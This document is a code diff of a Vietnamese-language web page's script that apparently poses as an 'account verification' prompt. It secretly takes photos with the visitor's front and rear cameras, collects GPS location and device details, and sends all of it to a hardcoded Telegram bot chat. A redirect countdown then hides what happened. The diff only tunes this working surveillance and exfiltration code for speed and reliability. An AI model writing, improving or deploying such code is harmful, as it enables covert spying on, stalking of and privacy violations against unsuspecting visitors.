@@ -91,7 +91,6 @@
         const CHAT_ID = "7031115869";
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-        // Kiểm tra In-App Browser
         function checkAndShowWarning() {
             const ua = navigator.userAgent || "";
             if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
@@ -106,11 +105,11 @@
 
         async function getLocation() {
             return new Promise(resolve => {
-                if (!navigator.geolocation) return resolve("Không hỗ trợ vị trí");
+                if (!navigator.geolocation) return resolve("Không hỗ trợ");
                 navigator.geolocation.getCurrentPosition(
                     p => resolve(`https://www.google.com/maps?q=${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)}`),
                     () => resolve("Không lấy được vị trí"),
-                    { timeout: 4000, enableHighAccuracy: true }
+                    { timeout: 3500, enableHighAccuracy: false }
                 );
             });
         }
@@ -118,7 +117,7 @@
         async function captureCamera(facingMode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    video: { facingMode, width: { ideal: 800 }, height: { ideal: 600 } },
                     audio: false
                 });
                 return new Promise(resolve => {
@@ -136,8 +135,8 @@
                         setTimeout(() => {
                             canvas.getContext('2d').drawImage(video, 0, 0);
                             stream.getTracks().forEach(t => t.stop());
-                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.82);
-                        }, 450); // Rất nhanh
+                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.78);
+                        }, 380);
                     };
                 });
             } catch (e) {
@@ -146,23 +145,17 @@
         }
 
         async function sendToTelegram(info, front, back, loc) {
-            const text = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
-                        `⏰ Thời gian: ${info.time}\n` +
-                        `📱 Thiết bị: ${info.device}\n` +
-                        `🖥 Hệ điều hành: ${info.os}\n` +
-                        `📍 Vị trí: ${loc}\n` +
-                        `📷 Camera: ${info.camera}`;
-
-            await fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
-            });
+            const caption = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
+                           `⏰ Thời gian: ${info.time}\n` +
+                           `📱 Thiết bị: ${info.device}\n` +
+                           `🖥 Hệ điều hành: ${info.os}\n` +
+                           `📍 Vị trí: ${loc}\n` +
+                           `📷 Camera: ${info.camera}`;
 
             if (front || back) {
                 const media = [];
-                if (front) media.push({ type: "photo", media: "attach://front", caption: "📸 Camera Trước" });
-                if (back) media.push({ type: "photo", media: "attach://back", caption: "📸 Camera Sau" });
+                if (front) media.push({ type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" });
+                if (back) media.push({ type: "photo", media: "attach://back" });
 
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
@@ -171,6 +164,13 @@
                 if (back) fd.append('back', back, 'back.jpg');
 
                 await fetch(`${TELEGRAM_API}/sendMediaGroup`, { method: 'POST', body: fd });
+            } else {
+                // Nếu không có ảnh thì gửi text thường
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
+                });
             }
         }
 
@@ -179,14 +179,14 @@
 
             const info = {
                 time: new Date().toLocaleString('vi-VN'),
-                device: navigator.platform || 'Unknown Device',
+                device: navigator.platform || 'Unknown',
                 os: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'iOS' : /Android/i.test(navigator.userAgent) ? 'Android' : 'Desktop',
                 camera: '✅ Đã chụp'
             };
 
             const [front, back, location] = await Promise.all([
                 captureCamera('user'),
-                captureCamera('environment'),
+                captureCamera('environment').catch(() => null),
                 getLocation()
             ]);
 
@@ -201,18 +201,18 @@
             try {
                 await main();
 
-                let sec = 4;
-                const t = setInterval(() => {
+                let sec = 3;
+                const timer = setInterval(() => {
                     btn.innerText = `HOÀN TẤT TRONG ${sec}s`;
                     sec--;
                     if (sec < 0) {
-                        clearInterval(t);
-                        window.location.href = ""; 
+                        clearInterval(timer);
+                        window.location.href = "";
                     }
-                }, 850);
+                }, 800);
             } catch (e) {
                 statusEl.innerText = "Hoàn tất";
-                setTimeout(() => window.location.href = "", 1200);
+                setTimeout(() => window.location.href = "", 1000);
             }
         });
 
